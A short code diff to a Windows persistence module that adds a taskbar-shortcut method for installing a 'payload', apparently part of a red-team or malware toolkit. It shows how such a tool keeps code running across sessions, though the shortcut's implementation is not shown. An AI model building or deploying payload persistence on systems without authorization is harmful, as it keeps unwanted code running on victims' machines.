@@ -5,7 +5,7 @@ windows.py: Windows-specific persistence logic.
 from .base import Persistence
 from .windows_utilities.startup import StartupFolder
 from .windows_utilities.persistence_methods import WindowsPersistenceMethods
-
+from .windows_utilities.shortcut import TaskbarShortcut
 
 class WindowsPersistence(Persistence):
     """
@@ -62,5 +62,8 @@ class WindowsPersistence(Persistence):
         if method == WindowsPersistenceMethods.STARTUP_GLOBAL.value:
             StartupFolder(payload=self.payload).install_global()
             return
-
+        if method == WindowsPersistenceMethods.SHORTCUT_USER.value:
+            TaskbarShortcut(payload=self.payload).install()
+            return
+            
         raise NotImplementedError(f"Method {method} not implemented.")
